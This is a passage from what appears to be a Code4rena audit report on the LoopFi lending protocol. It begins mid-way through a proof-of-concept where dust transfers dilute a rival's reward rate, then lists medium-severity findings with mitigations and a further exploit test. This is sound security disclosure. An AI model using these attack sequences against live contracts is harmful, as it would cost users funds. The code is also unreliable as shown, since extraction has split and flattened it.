getReward ( rewards ); uint256 balanceBefore = rewardToken.

balanceOf ( address ( alice )); uint256 dailyTokens1 = rewardToken.

balanceOf ( address ( alice )) / 20; // the amount that alice has devided by the 20 days console.

log ( dailyTokens1 ); //These are the tokens that alice gets per day - 3.33e18 for ( uint i = 0; i < 20; i ++) { vm.

prank ( bob ); rewardToken.

transfer ( address ( multiFeeDistribution ), 1 ); //bob transfers the dust amount vm.

prank ( bob ); multiFeeDistribution.

getReward ( rewards ); //calls get reward to update the rate vm.

warp ( block.

timestamp + 1 days ); vm.

prank ( alice ); multiFeeDistribution.

getReward ( rewards ); uint256 dailyTokens2 = rewardToken.

balanceOf ( address ( alice )) - balanceBefore; balanceBefore = rewardToken.

balanceOf ( address ( alice )); console.

log ( "New daily token rewards:" ); console.

log ( dailyTokens2 ); //1e18 vm.

warp ( block.

timestamp + 3 days ); //waits another three days } //at the end bob managed to make it 0.326912783616223995 per day and he can slow it down however he wants //What is more is that alice will have to wait for another 30 days!

console.

log ( 0.1 ether - rewardToken.

balanceOf ( address ( bob ))); //Bob spent 20(not 0.20e18) } // @IMPORTANT Performing the attack once instead of twenty times can result in decreasing the rate //and the duration will be reset, starting from beginning again!

} The output is the following:

Results after running the attack once: Logs:

daily rewards under normal conditions 3333333333333333333 New daily token rewards:

1111111111111111111 spent by bob on the attack NOT e18 1 Pending rewards that the user will get after another 30 days instead of two of nobody does the attack again:

32222222222222222224 Results after running the attack 20 times: Logs:

3333333333333333333 - under normal conditions New daily token rewards:

1111111111111111111 New daily token rewards:

4296296296296296296 New daily token rewards:

3723456790123456790 New daily token rewards:

3226995884773662551 New daily token rewards:

2796729766803840878 New daily token rewards:

2423832464563328760 New daily token rewards:

2100654802621551592 New daily token rewards:

1820567495605344713 New daily token rewards:

1577825162857965418 New daily token rewards:

1367448474476903363 New daily token rewards:

1185122011213316248 New daily token rewards:

1027105743051540748 New daily token rewards:

890158310644668648 New daily token rewards:

771470535892046162 New daily token rewards:

668607797773106673 New daily token rewards:

579460091403359117 New daily token rewards:

502198745882911235 New daily token rewards:

435238913098523070 New daily token rewards:

377207058018719994 New daily token rewards:

326912783616223995 20 The attack can be performed by anyone and allows anyone to extend reward finish time indefinitely and causing loss of funds for the users. So I consider it to be a valid High under the following C4 rule: “3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).” It also does not require any specific external conditions and can be performed anytime. Also the problem is not the attack itself, as it will happen anytime the contract’s balance has changed. This means that even if it is used “the right way” by the protocol team, they will mess up the whole distribution so basically the whole functionality as-is now is useless.

Koolex (judge) commented:

@radin100 - I am getting EVM revert. Any special steps to produce the output above?

Ran 1 test for

# [M-01] Bringing a position from unsafe to safe by liquidation partially

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-01
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

Submitted by Evo The CDPVault’s liquidation mechanism allows partial liquidations to temporarily bring unsafe positions back to a safe state. This can delay necessary liquidations if collateral prices continue to fall, potentially leading to increased risk and larger losses for the protocol.

## Recommended Mitigation Steps

Flag positions as unsafe when they become unsafe, and revert them to safe status upon additional collateral deposits. However, this approach is suboptimal. A comprehensive reevaluation of the liquidation mechanism is necessary.

Koolex (judge) commented:

# [M-02] Wrong repayment amount used in PositionAction::_repay , forcing users to unexpectedly lose funds

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-02
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PositionAction::_repay, forcing users to unexpectedly lose funds Submitted by 0xAlix2, also found by zhaojohnson, 0xbepresent, hash, and pkqs90 PositionAction allows users to interact with their position in the CDP Vault through a proxy, on top of that it allows users to do certain actions before interacting with the position. An example of this is the PositionAction::deposit, which allows users to:

Deposit collateral tokens directly into the position.

Swap arbitrary tokens for collateral and the deposit into the position.

This is handled in PositionAction::_deposit, where if swap params exist, swap takes place and the returned amount is used when depositing into the position; else the user’s specified amount is used.

However, in PositionAction::_repay, this is not the case, where even if a swap took place, the amount sent to the vault/position is still the one specified by the user; which is wrong and inconsistent with the other functions’ API. This can cause unexpected behaviors and reverts when users try to interact with PositionAction::repay.

## Recommended Mitigation Steps

Update the moving amount of the underlying token after the swap, and use that value when repaying, which matches the logic in PositionAction::_deposit, something similar to the following:

function _repay ( address vault, address position, CreditParams calldata creditParams, PermitParams calldata permitParams ) internal { // transfer arbitrary token and swap to underlying token uint256 amount = creditParams.

amount; if ( creditParams.

auxSwap.

assetIn != address ( 0 )) { if ( creditParams.

auxSwap.

recipient != address ( this )) revert PositionAction__repay_InvalidAuxSwap (); amount = _transferAndSwap ( creditParams.

creditor, creditParams.

auxSwap, permitParams ); } else { if ( creditParams.

creditor != address ( this )) { // transfer directly from creditor _transferFrom ( address ( underlyingToken ), creditParams.

creditor, address ( this ), amount, permitParams ); } underlyingToken.

forceApprove ( address ( vault ), amount ); ICDPVault ( vault ).

modifyCollateralAndDebt ( position, address ( this ), address ( this ), 0, - toInt256 ( amount )); }

## Assessed type

Error amarcu (LoopFi) confirmed via duplicate Issue #110 Koolex (judge) decreased severity to Medium

# [M-03] SwapAction::getSwapToken will return wrong swap token for balancer EXACT_OUT swaps

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-03
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

SwapAction::getSwapToken will return wrong swap token for balancer EXACT_OUT swaps Submitted by 0xAlix2 As known, when doing a Balancer EXACT_OUT batch swap, assets should be passed in reverse order, this is thoroughly documented here.

Swapping in USDC for an exact amount out of BAL swapType = `EXACT_OUT` and `assets` = [BAL, WETH, DAI, USDC]:

However, in SwapAction::getSwapToken, for Balancer swaps it always returns the last asset in the assets array, which is correct for EXACT_IN but wrong for EXACT_OUT, where it should be the first asset in the assets array.

## Recommended Mitigation Steps

Add the following in SwapAction::getSwapToken:

if ( swapParams.

swapType == SwapType.

EXACT_OUT ) token = primarySwapPath [ 0 ]; else token = primarySwapPath [ primarySwapPath.

length - 1 ];

## Assessed type

Error amarcu (LoopFi) confirmed

# [M-04] INFLATION_PROTECTION_TIME can not be up to a year as intended because it is hardcoded to 1749120350

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-04
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

INFLATION_PROTECTION_TIME can not be up to a year as intended because it is hardcoded to 1749120350 Submitted by Kaysoft

- https://github.com/code-423n4/2024-07-loopfi/blob/4f508781a49ffa53511e7e5ed6cda0ff0eb5bdc5/src/vendor/AuraVault.sol#L66
- https://github.com/code-423n4/2024-07-loopfi/blob/main/src/vendor/AuraVault.sol#L301-L307

## Impact

AURA rewards will be distributed at a lesser time than a year. In fact, if the AuraVault.sol contract is deployed 295 days after the completion of this audit, No aura rewards will be distributed. This is because the INFLATION_PROTECTION_TIME is hardcoded to 1749120350.

## Recommended Mitigation Steps

Consider setting the INFLATION_PROTECTION_TIME in the constructor instead of hardcoding it.

-- uint256 private constant INFLATION_PROTECTION_TIME = 1749120350; ++ uint256 private immutable INFLATION_PROTECTION_TIME; constructor(...

) ERC4626(IERC20(asset_)) ERC20(tokenName_, tokenSymbol_) {...

++ INFLATION_PROTECTION_TIME = block.timestamp + 365 days; }

## Assessed type

Timing amarcu (LoopFi) acknowledged and commented:

Acknowledged but we will remove and not use the AuraVault.

# [M-05] PositionAction4626::increaseLever will always revert

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-05
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PositionAction4626::increaseLever will always revert Submitted by 0xAlix2, also found by web3km, zhaojohnson, Nyx, 0xbepresent, joaovwfreire, hash, pkqs90, and nnez Users can use PositionAction::increaseLever to increase their positions’ leverage, i.e., increasing both the collateral and debt, by taking a flash loan and doing some swaps. At the end of the process, after swapping “borrow” tokens to underlying tokens they should be returned to the vault under the position’s “name”.

For ERC20 collateral positions, this is happening in PositionAction20::_onIncreaseLever (that gets called in PositionAction::onFlashLoan ) which approves the vault to spend some amount and then returns the amount to be later sent using the following in PositionAction::onFlashLoan:

// add collateral and debt ICDPVault ( leverParams.

vault ).

modifyCollateralAndDebt ( leverParams.

position, address ( this ), address ( this ), toInt256 ( collateral ), toInt256 ( addDebt ) ); However, for ERC4626 collateral positions, PositionAction4626::_onIncreaseLever is both approving the amount and depositing it into the vault under address(this) which IS NOT the position’s proxy but PositionAction4626 contract as it is the flash loan callback function and isn’t delegated like increaseLever. When _onIncreaseLever finishes, it’ll try to deposit the collateral AGAIN in the vault using this; which will for sure revert, as the approval was spent and no funds are left to make the deposit.

This will cause PositionAction4626::increaseLever to always revert and never work, blocking users from leveraging their positions.

## Recommended Mitigation Steps

In PositionAction4626::_onIncreaseLever, replace:

return ICDPVault ( leverParams.

vault ).

deposit ( address ( this ), addCollateralAmount ); with:

return addCollateralAmount;

## Assessed type

DoS amarcu (LoopFi) confirmed

# [M-06] PoolAction::updateLeverJoin wrongly updates assetsIn array, leading to PositionAction4626::_onIncreaseLever to always revert

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-06
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PoolAction::updateLeverJoin wrongly updates assetsIn array, leading to PositionAction4626::_onIncreaseLever to always revert Submitted by 0xAlix2, also found by NexusAudits Users can use PositionAction4626 to interact with the corresponding vault using their opened positions.

PositionAction4626 allows users to deposit/withdraw/leverage their positions, increaseLever enables users to increase their positions’ collateral and debt. For the most part, it’s the same as for PositionAction20, where users swap the lent borrow tokens for collateral tokens, and then deposit them into the position.

The only change is that PositionAction4626 allows users on top of that to join a Balancer pool with the swapped tokens. This is done in PositionAction4626::_onIncreaseLever. The main part that we care about is PoolAction::updateLeverJoin which adds the upfront amount to the amounts in. The way Balancer works is that it accepts an array of “amounts in”, according to the tokens array where indices should match, BUT it should skip the BPT token, this is where the function messes up.

This is mainly done in the following loop:

for ( uint256 i = 0; i < len; ) { uint256 assetIndex = i - ( skipIndex ?

1:

0 ); if ( assets [ i ] == joinToken ) { maxAmountsIn [ i ] = joinAmount; assetsIn [ assetIndex ] = joinAmount; } else if ( assets [ i ] == upFrontToken && assets [ i ] != poolToken ) { maxAmountsIn [ i ] = upfrontAmount; assetsIn [ assetIndex ] = upfrontAmount; } else { skipIndex = skipIndex || assets [ i ] == poolToken; } unchecked { i ++; } The goal of the above loop is to add the upfront amount to the corresponding amountIn. The protocol passes the poolToken as the collaterals 4626’s underlying token, which is not always true. In most cases, it won’t match any of the tokens array. Because of this, the above for loop will be wrongly updating and overriding the assetsIn array.

This blocks users from increasing the leverage of their positions where the collateral is an ERC4626 token.

## Recommended Mitigation Steps

Set the poolToken according to the Balancer’s vault and PoolId, something to:

function updateLeverJoin ( PoolActionParams memory poolActionParams, address joinToken, address upFrontToken, uint256 flashLoanAmount, uint256 upfrontAmount ) external view returns ( PoolActionParams memory outParams ) { outParams = poolActionParams; if ( poolActionParams.

protocol == Protocol.

BALANCER ) { ( bytes32 poolId, address [] memory assets, uint256 [] memory assetsIn, uint256 [] memory maxAmountsIn ) = abi.

decode ( poolActionParams.

args, ( bytes32, address [], uint256 [], uint256 [])); address poolToken = balancerVault.

getPool ( poolId ); uint256 len = assets.

length; // the offset is needed because of the BPT token that needs to be skipped from the join bool skipIndex = false; uint256 joinAmount = flashLoanAmount; if ( upFrontToken == joinToken ) { joinAmount += upfrontAmount; } // update the join parameters with the new amounts for ( uint256 i = 0; i < len; ) { uint256 assetIndex = i - ( skipIndex ?

1:

0 ); if ( assets [ i ] == joinToken ) { maxAmountsIn [ i ] = joinAmount; assetsIn [ assetIndex ] = joinAmount; } else if ( assets [ i ] == upFrontToken && assets [ i ] != poolToken ) { maxAmountsIn [ i ] = upfrontAmount; assetsIn [ assetIndex ] = upfrontAmount; } else { skipIndex = skipIndex || assets [ i ] == poolToken; } unchecked { i ++; } // update the join parameters outParams.

args = abi.

encode ( poolId, assets, assetsIn, maxAmountsIn ); }

## Assessed type

DoS amarcu (LoopFi) confirmed

# [M-07] PositionAction4626::_onDecreaseLever wrongly updates tokenOut forcing user’s funds to be stuck in the position action contract

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-07
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PositionAction4626::_onDecreaseLever wrongly updates tokenOut forcing user’s funds to be stuck in the position action contract Submitted by 0xAlix2, also found by pkqs90 Users can use PositionAction::decreaseLever to decrease the leverage of their positions when the collateral is an ERC4626, that position action interacts with PositionAction4626::_onDecreaseLever. With that, the protocol gives the ability to join/exit Balancer pools, leveraging down an ERC4626 position is handled in PositionAction4626::_onDecreaseLever.

This first step is that tokenOut is set to the redeemed 4626 amount; however, when auxAction exists, (i.e. the user wants to exit a Balancer pool), the tokenOut is updated to return the amount of the exit position, this poses multiple issues:

If the token out from Balancer is not the same as 4626’s underlying this will wrongly update to another token’s amount.

If the recipient is not in the position action contract, the tokens would be sent to another address, while it assumes that it received them.

If the token = 4626 ’s underlying, the recipient is the user, and the amount of from Balancer is less than the redeemed tokenOut, the contract would set the tokenOut as the Balancer return amount, which is less than the original tokenOut. This will return the wrong tokenOut in PositionAction::onCreditFlashLoan, sending the user a residual amount less than the real amount (the POC below is for this scenario).

The user’s “extra” collateral amount will end up stuck in the position action contract forever.

## Recommended Mitigation Steps

Handle the multiple scenarios where the recipient might not be the position actions contract or where the tokenOut from Balancer isn’t the same as the 4626’s underlying token. In the if block, just set the tokenOut as the contract’s balance which should handle all edge cases.

function _onDecreaseLever( LeverParams memory leverParams, uint256 subCollateral ) internal override returns (uint256 tokenOut) {...

if (leverParams.auxAction.args.length != 0) { bytes memory exitData = _delegateCall( address(poolAction), abi.encodeWithSelector(poolAction.exit.selector, leverParams.auxAction) ); - tokenOut = abi.decode(exitData, (uint256)); + tokenOut = IERC20(IERC4626(leverParams.collateralToken).asset()).balanceOf(address(this)); }

## Assessed type

Error amarcu (LoopFi) confirmed Koolex (judge) decreased severity to Medium Note: For full discussion, see here.

# [M-08] PoolAction::_balancerExit returns wrong token out amount

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-08
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PoolAction::_balancerExit returns wrong token out amount Submitted by 0xAlix2 Users use PoolAction::exit to exit a Balancer pool position, it calls _balancerExit to do the job. It is expected to exit the pool and return the amount out of the token; however, it returns the whole recipient’s balance, without considering the case where the recipient is holding an amount of the same token from different sources. It’ll return an exaggerated amount rather than the amount out.

This will cause PositionAction4626::_onDecreaseLever to revert sometimes. In this case, the user is leveraging down, exiting a Balancer pool, and holds some tokenOut amount. In PositionAction::onCreditFlashLoan, withdrawnCollateral would be an unreal exaggerated amount, and the contract will try to send back residualAmount which will be greater than its balance.

## Recommended Mitigation Steps

Instead of returning the whole recipient’s balance, return the difference between his balances before and after the exit.

function _balancerExit(PoolActionParams memory poolActionParams) internal returns (uint256 retAmount) { ( bytes32 poolId, address bpt, uint256 bptAmount, uint256 outIndex, address[] memory assets, uint256[] memory minAmountsOut ) = abi.decode(poolActionParams.args, (bytes32, address, uint256, uint256, address[], uint256[])); if (bptAmount != 0) IERC20(bpt).forceApprove(address(balancerVault), bptAmount); + uint256 tmpOutIndex = outIndex; + for (uint256 i = 0; i <= tmpOutIndex; i++) if (assets[i] == bpt) tmpOutIndex++; + uint256 balanceBefore = IERC20(assets[tmpOutIndex]).balanceOf(poolActionParams.recipient); balancerVault.exitPool( poolId, address(this), payable(poolActionParams.recipient), ExitPoolRequest({

assets: assets, minAmountsOut: minAmountsOut, userData: abi.encode(ExitKind.EXACT_BPT_IN_FOR_ONE_TOKEN_OUT, bptAmount, outIndex), toInternalBalance: false }) ); - for (uint256 i = 0; i <= outIndex; ) { - if (assets[i] == bpt) { - outIndex++; - } - - unchecked { - ++i; - } - return IERC20(assets[outIndex]).balanceOf(address(poolActionParams.recipient)); + return IERC20(assets[tmpOutIndex]).balanceOf(poolActionParams.recipient) - balanceBefore; }

## Assessed type

DoS amarcu (LoopFi) confirmed Koolex (judge) commented:

Could you please adjust the PoC to support this claim in PJQA please?

This will cause PositionAction4626::_onDecreaseLever to revert sometimes. In this case, the user is leveraging down, exiting a Balancer pool, and holds some tokenOut amount. In PositionAction::onCreditFlashLoan, withdrawnCollateral would be an unreal exaggerated amount, and the contract will try to send back residualAmount which will be greater than it’s balance 0xAlix2 (warden) commented:

@Koolex - My bad for not providing it in the original issue, but I wanted to keep it as simple as possible as this POC is a bit more complicated.

The following test assuming 3 reported bugs are fixed, similar to issue #240, to workaround this:

In PositionAction4626::_onDecreaseLever, replace:

uint256 withdrawnCollateral = ICDPVault ( leverParams.

vault ).

withdraw ( address ( this ), subCollateral ); with:

uint256 withdrawnCollateral = ICDPVault ( leverParams.

vault ).

withdraw ( leverParams.

position, subCollateral ); In PositionAction4626::_onIncreaseLever, replace:

return ICDPVault ( leverParams.

vault ).

deposit ( address ( this ), addCollateralAmount ); with:

return addCollateralAmount; At the top of PoolAction::updateLeverJoin, add:

poolToken = balancerVault.

getPool ( poolId ); contract PositionAction4626_Lever_Test is IntegrationTestBase { using SafeERC20 for ERC20; PRBProxy userProxy; address user; CDPVault vault; StakingLPEth stakingLPEth; PositionAction4626 positionAction; PermitParams emptyPermitParams; SwapParams emptySwap; PoolActionParams emptyPoolActionParams; bytes32 [] weightedPoolIdArray; address constant wstETH_bb_a_WETH_BPTl = 0x41503C9D499ddbd1dCdf818a1b05e9774203Bf46; address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0; address constant bbaweth = 0xbB6881874825E60e1160416D6C426eae65f2459E; bytes32 constant poolId = 0x41503c9d499ddbd1dcdf818a1b05e9774203bf46000000000000000000000594; function setUp () public

override { super.

setUp (); setGlobalDebtCeiling ( 15_000_000 ether ); token = ERC20PresetMinterPauser ( wstETH ); stakingLPEth = new StakingLPEth ( address ( token ), "Staking LP ETH", "sLPETH" ); stakingLPEth.

setCooldownDuration ( 0 ); vault = createCDPVault ( stakingLPEth, 5_000_000 ether, 0, 1.25 ether, 1.0 ether, 1.05 ether ); createGaugeAndSetGauge ( address ( vault ), address ( stakingLPEth )); user = vm.

addr ( 0x12341234 ); userProxy = PRBProxy ( payable ( address ( prbProxyRegistry.

deployFor ( user )))); positionAction = new PositionAction4626 ( address ( flashlender ), address ( swapAction ), address ( poolAction ), address ( vaultRegistry ) ); weightedUnderlierPoolId = _createBalancerPool ( address ( token ), address ( underlyingToken )).

getPoolId (); oracle.

updateSpot ( address ( token ), 1 ether ); oracle.

updateSpot ( address ( stakingLPEth ), 1 ether ); weightedPoolIdArray.

push ( weightedUnderlierPoolId ); } function test_wrongBalancerExitAmount_2 () public { uint256 depositAmount = 250 ether; uint256 borrowAmount = 100 ether; uint256 flashLoanAmount = borrowAmount / 2; deal ( address ( token ), user, depositAmount ); address [] memory assets = new address []( 2 ); assets [ 0 ] = address ( underlyingToken ); assets [ 1 ] = address ( token ); address [] memory tokens = new address []( 3 ); tokens [ 0 ] = wstETH_bb_a_WETH_BPTl; tokens [ 1 ] = wstETH; tokens [ 2 ] = bbaweth; vm.

startPrank ( user ); // Deposit `wstETH` to get `sLPETH` // Deposit 250 `sLPETH` to vault { token.

approve ( address ( stakingLPEth ), depositAmount ); stakingLPEth.

approve ( address ( userProxy ), depositAmount ); stakingLPEth.

deposit ( depositAmount, user ); userProxy.

execute ( address ( positionAction ), abi.

encodeWithSelector ( positionAction.

deposit.

selector, address ( userProxy ), address ( vault ), CollateralParams ({ targetToken:

address ( stakingLPEth ), amount:

depositAmount, collateralizer:

address ( user ), auxSwap:

emptySwap }), emptyPermitParams ) ); } // Borrow 100 ETH { userProxy.

execute ( address ( positionAction ), abi.

encodeWithSelector ( positionAction.

borrow.

selector, address ( userProxy ), address ( vault ), CreditParams ({ amount:

borrowAmount, creditor:

user, auxSwap:

emptySwap }) ) ); // Collateral is 250 ETH, debt is 100 ETH ( uint256 collateral, uint256 debt,,,, ) = vault.

positions ( address ( userProxy )); assertEq ( collateral, depositAmount ); assertEq ( debt, borrowAmount ); } // Increase leverage // Takes a flash loan of 50 ETH borrow tokens (adds that as a debt) // Swap the borrow tokens to collateral tokens, and join Balancer pool // (around 49 collateral tokens are deposited into the balancer position) { uint256 [] memory maxAmountsIn = new uint256 []( 3 ); maxAmountsIn [ 0 ] = 0; maxAmountsIn [ 1 ] = borrowAmount / 2 - 1 ether; maxAmountsIn [ 2 ] = 0; uint256 [] memory tokensIn = new uint256 []( 2 ); tokensIn [ 0 ] = borrowAmount / 2 - 1 ether; tokensIn [ 1 ] = 0; userProxy.

execute ( address ( positionAction ), abi.

encodeWithSelector ( positionAction.

increaseLever.

selector, LeverParams ({ position:

address ( userProxy ), vault:

address ( vault ), collateralToken:

address ( stakingLPEth ), primarySwap:

SwapParams ({ swapProtocol:

SwapProtocol.

BALANCER, swapType:

SwapType.

EXACT_IN, assetIn:

address ( underlyingToken ), amount:

flashLoanAmount, limit:

0, recipient:

address ( positionAction ), deadline:

block.

timestamp, args:

abi.

encode ( weightedPoolIdArray, assets ) }), auxSwap:

emptySwap, auxAction:

PoolActionParams ( Protocol.

BALANCER, 0, user, abi.

encode ( poolId, tokens, tokensIn, maxAmountsIn ) }), address ( 0 ), 0, address ( user ), emptyPermitParams ) ); // Collateral remains the same, debt increases by 50 ETH // User has around 56 Balancer LP tokens ( uint256 collateral, uint256 debt,,,, ) = vault.

positions ( address ( userProxy )); assertEq ( collateral, depositAmount ); assertEq ( debt, borrowAmount + flashLoanAmount ); assertEq ( IERC20 ( wstETH_bb_a_WETH_BPTl ).

balanceOf ( user ) / 1 ether, 56 ); } { // Verify that the position action contract and the user don't hold any collateral tokens assertEq ( token.

balanceOf ( address ( positionAction )), 0 ); assertEq ( token.

balanceOf ( user ), 0 ); uint256 [] memory minAmountsOut = new uint256 []( 3 ); minAmountsOut [ 0 ] = 0; minAmountsOut [ 1 ] = 0; minAmountsOut [ 2 ] = 0; // Send the Balancer LP tokens to the position action contract, to exit the Balancer pool uint256 bptAmount = IERC20 ( wstETH_bb_a_WETH_BPTl ).

balanceOf ( user ); IERC20 ( wstETH_bb_a_WETH_BPTl ).

transfer ( address ( positionAction ), bptAmount ); deal ( address ( token ), user, depositAmount ); // User holds 100 tokens assertEq ( token.

balanceOf ( user ), depositAmount ); // Leverage down the position // Takes a flash loan of 40 ETH borrow tokens (decreases the debt), withdraws 70 ETH collateral tokens (residual should be sent to the user) // Swap collateral tokens to borrow tokens, to repay the flash loan // Exits the Balancer pool, and sends the residual collateral tokens to the user // REVERTS vm.

expectRevert ( bytes ( "ERC20: transfer amount exceeds balance" )); userProxy.

execute ( address ( positionAction ), abi.

encodeWithSelector ( positionAction.

decreaseLever.

selector, LeverParams ({ position:

address ( userProxy ), vault:

address ( vault ), collateralToken:

address ( stakingLPEth ), auxSwap:

emptySwap, primarySwap:

SwapParams ({ swapProtocol:

SwapProtocol.

BALANCER, swapType:

SwapType.

EXACT_OUT, assetIn:

address ( token ), amount:

40 ether, limit:

50 ether, recipient:

address ( positionAction ), deadline:

block.

timestamp, args:

abi.

encode ( weightedPoolIdArray, assets ) }), auxAction:

PoolActionParams ( Protocol.

BALANCER, 0, user, abi.

encode ( poolId, wstETH_bb_a_WETH_BPTl, bptAmount, 0, tokens, minAmountsOut ) }), 70 ether, address ( user ) ); } function _createBalancerPool ( address t1, address t2 ) internal returns ( IComposableStablePool pool_ ) { uint256 amount = 5_000_000_000 ether; deal ( t1, address ( this ), amount ); deal ( t2, address ( this ), amount ); uint256 [] memory maxAmountsIn = new uint256 []( 2 ); address [] memory assets = new address []( 2 ); assets [ 0 ] = t1; uint256 [] memory weights = new uint256 []( 2 ); weights [ 0 ] = 500000000000000000; weights [ 1 ] = 500000000000000000; bool tokenPlaced; address tempAsset; for ( uint256 i; i < assets.

length; i ++) { if (!

tokenPlaced ) { if ( uint160 ( assets [ i ]) > uint160 ( t2 )) { tokenPlaced = true; tempAsset = assets [ i ]; assets [ i ] = t2; } else if ( i == assets.

length - 1 ) { assets [ i ] = t2; } else { address placeholder = assets [ i ]; assets [ i ] = tempAsset; tempAsset = placeholder; } for ( uint256 i; i < assets.

length; i ++) { maxAmountsIn [ i ] = ERC20 ( assets [ i ]).

balanceOf ( address ( this )); ERC20 ( assets [ i ]).

safeApprove ( address ( balancerVault ), maxAmountsIn [ i ]); } pool_ = weightedPoolFactory.

create ( "50WETH-50TOKEN", "50WETH-50TOKEN", assets, weights, 3e14, // swapFee (0.03%) address ( this ) // owner ); balancerVault.

joinPool ( pool_.

getPoolId (), address ( this ), address ( this ), JoinPoolRequest ({ assets:

assets, maxAmountsIn:

maxAmountsIn, userData:

abi.

encode ( JoinKind.

INIT, maxAmountsIn ), fromInternalBalance:

false }) ); } function getForkBlockNumber () internal pure virtual override ( IntegrationTestBase ) returns ( uint256 ) { return 17870449; // Aug-08-2023 01:17:35 PM +UTC } Koolex (judge) commented:

@0xAlix2 - Could you please explain why should we update the code according to point 3 above?

0xAlix2 (warden) commented:

@Koolex - The third point refers to another issue that is reported, Issue 241, it just bypasses that issue and makes sure it doesn’t revert because of that issue. Issue #241 just shows a more sophisticated mitigation.

# [M-09] PendleLPOracle::_fetchAndValidate uses Chainlink’s deprecated answeredInRound

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-09
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PendleLPOracle::_fetchAndValidate uses Chainlink’s deprecated answeredInRound Submitted by 0xAlix2, also found by 0xAlix2, peanuts ( 1, 2 ), Bauchibred, Rhaydden, 0xhacksmithh, unRekt, inh3l, atoko, 0xjoaovpsantos, Kaysoft ( 1, 2, 3 ), lightoasis, jolah1, josephxander, web3km, 0xINFINITY ( 1, 2, 3 ), Spearmint, zhaojohnson, Bigsam, 0xBugSlayer, Infect3d, Sungyu, yashar ( 1, 2 ), emmac002, pks_, y0ng0p3, EPSec, grearlake, 0xspryon, 0XRolko, 0xAadi, Damola0x, 4B, Sparrow, crypticdefense, NexusAudits, pkqs90 ( 1, 2 ), novamanbg, and BiasedMerc PendleLPOracle uses Chainlink to get the price of Pendle’s underlying asset in ETH; this is done using _fetchAndValidate. That function uses answeredInRound, which is deprecated according to Chainlink docs.

answeredInRound: Deprecated - Previously used when answers could take multiple rounds to be computed.

This results in invalid/wrong prices from Chainlink.

## Recommended Mitigation Steps

Remove the usage of answeredInRound in PendleLPOracle::_fetchAndValidate.

## Assessed type

Oracle 0xtj24 (LoopFi) confirmed

# [M-10] Malicious actor can abuse the minimum shares check in StakingLPEth and cause DoS or locked funds for the last user that withdraws

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-10
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

StakingLPEth and cause DoS or locked funds for the last user that withdraws Submitted by web3km, also found by asui, Eeyore, 0xMax1mus, Spearmint, boraichodrunkenmaster, zhaojohnson, peanuts, lian886 ( 1, 2 ), Infect3d, yashar, emmac002, Walter, Afriauditor, zhaojie ( 1, 2 ), 0xpiken, grearlake, Breeje, 0xAadi, hash, pkqs90, and nnez

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L141-L144
- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L71
- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L112

## Impact

The last user that tries to cooldown/withdraw his share will not be able to withdraw the full deposited amount.

## Recommended Mitigation Steps

Consider funding the contract in the deployment script and remove the MIN_SHARES check to ensure that no DoS or locking of funds is possible.

## Assessed type

Error 0xtj24 (LoopFi) acknowledged and commented:

This behaviour is expected. After deployment of the contracts, the protocol will mint the minimum shares.

Koolex (judge) decreased severity to Medium Note: For full discussion, see here.

# [M-11] CDPVault.liquidatePosition() does not scale takeCollateral with tokenScale ; therefore, it might send the wrong amount of collateral to the liquidator when tokenScale ! = 1 ether

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-11
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

CDPVault.liquidatePosition() does not scale takeCollateral with tokenScale; therefore, it might send the wrong amount of collateral to the liquidator when tokenScale ! = 1 ether Submitted by chaduke, also found by lightoasis, jigster, and AKA8u9K111er First of all, in CDPVault, the amount of collateral maintained in each position is scaled using tokenScale. See the code in deposit:

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L223-L233
and the function modifyCollateralAndDebt():

